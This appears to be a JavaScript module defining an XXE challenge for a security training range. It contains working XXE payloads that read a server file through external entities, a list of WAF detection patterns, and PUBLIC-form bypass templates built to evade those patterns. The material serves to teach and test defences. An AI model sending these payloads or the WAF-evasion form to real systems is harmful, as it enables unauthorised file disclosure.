// XXE — per-tier defence contract.
// T0: external entities resolve unconstrained; the canonical DOCTYPE with a
//     SYSTEM external entity reads the server-side canary file.
// T1: a signature WAF inspects the request body and blocks the canonical
//     declaration shape (an ENTITY ... SYSTEM pair). The puzzle remains
//     solvable because the same XML semantics can be expressed via the
//     PUBLIC form (XML 1.0 §4.2.2: the second pseudo-attribute on PUBLIC is
//     a SYSTEM identifier the parser uses as a fallback URI). libxml2
//     resolves the SYSTEM URI from PUBLIC, so the file read still fires.

// Canonical XML reused by the fireExploit fallback and by the T0/T1
// canonicalPayload entries — keeps the literal string in one place.
export function canonicalXml(secretPath) {
  return `<?xml version="1.0"?>\n<!DOCTYPE data [ <!ENTITY xxe SYSTEM "file://${secretPath}"> ]>\n<data><value>&xxe;</value></data>`
}

const SECRET_PATH = process.env.POLYRANGE_XXE_SECRET_PATH || '/app/data/license.dat'

// Signature pool a real XML-aware WAF might ship. Each entry targets a
// recognisable XXE declaration shape. The deploy picks a random subset and
// always pins the canonical-blocking rule.
export const RULE_POOL = [
  { name: 'xxe-entity-system',     pattern: '<!ENTITY\\s+\\w+\\s+SYSTEM', flags: 'i' },
  { name: 'xxe-param-entity-pct',  pattern: '<!ENTITY\\s+%\\s', flags: 'i' },
  { name: 'xxe-file-scheme-uri',   pattern: '\\bSYSTEM\\s+["\']file:', flags: 'i' },
  { name: 'xxe-php-filter-uri',    pattern: '\\bSYSTEM\\s+["\']php:', flags: 'i' },
  { name: 'xxe-data-scheme-uri',   pattern: '\\bSYSTEM\\s+["\']data:', flags: 'i' },
  { name: 'xxe-expect-scheme-uri', pattern: '\\bSYSTEM\\s+["\']expect:', flags: 'i' },
  { name: 'xxe-dtd-include-attr',  pattern: '<!DOCTYPE[^>]*SYSTEM\\s+["\']http', flags: 'i' },
]

// Bypass templates — XML documents that read the same file but evade the
// pinned ENTITY+SYSTEM signature. Each template is validated at deploy time.
//   1. PUBLIC form. libxml2 resolves the second URI as a SYSTEM identifier
//      so the file:// fetch still happens, but the literal `SYSTEM` token
//      next to the entity name is gone.
//   2. PUBLIC form with a different entity name and an alternate FPI string.
//   3. PUBLIC form referenced through an inner element wrapper.
export const BYPASS_TEMPLATES = [
  () => `<?xml version="1.0"?>\n<!DOCTYPE data [ <!ENTITY xxe PUBLIC "-//xxe//license//EN" "file://${SECRET_PATH}"> ]>\n<data><value>&xxe;</value></data>`,
  () => `<?xml version="1.0"?>\n<!DOCTYPE root [ <!ENTITY lic PUBLIC "any" "file://${SECRET_PATH}"> ]>\n<root><field>&lic;</field></root>`,
  () => `<?xml version="1.0"?>\n<!DOCTYPE record [ <!ENTITY canary PUBLIC "-//app//cfg//EN" "file://${SECRET_PATH}"> ]>\n<record><value>prefix &canary; suffix</value></record>`,
]

export const defences = {
  0: {
    canonicalPayload: () => canonicalXml(SECRET_PATH),
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    canonicalPayload: () => canonicalXml(SECRET_PATH),
    naiveBlockedExpected: true,
    bypassPayloads: BYPASS_TEMPLATES,
  },
}

// Per-deploy WAF config. The canonical-blocking rule is always pinned; a
// random subset of decoy XXE signature rules is layered on top. Bypass
// templates are constructed so none of the rules above (pinned or decoy)
// match them — the PUBLIC declaration shape sidesteps SYSTEM-keyword rules.
export function generateT1Config(rng = Math.random) {
  const required = ['xxe-entity-system']
  const optional = RULE_POOL.filter(r => !required.includes(r.name))
  const extraCount = 2 + Math.floor(rng() * (optional.length - 1))
  const shuffled = [...optional].sort(() => rng() - 0.5)
  const picked = [
    ...RULE_POOL.filter(r => required.includes(r.name)),
    ...shuffled.slice(0, extraCount),
  ]
  const styles = ['cloudflare1020', 'awsCloudfront', 'modSecurity', 'generic403', 'fake500', 'silent200']
  return {
    waf: {
      rules: picked,
      blockPageStyle: styles[Math.floor(rng() * styles.length)],
    },
  }
}
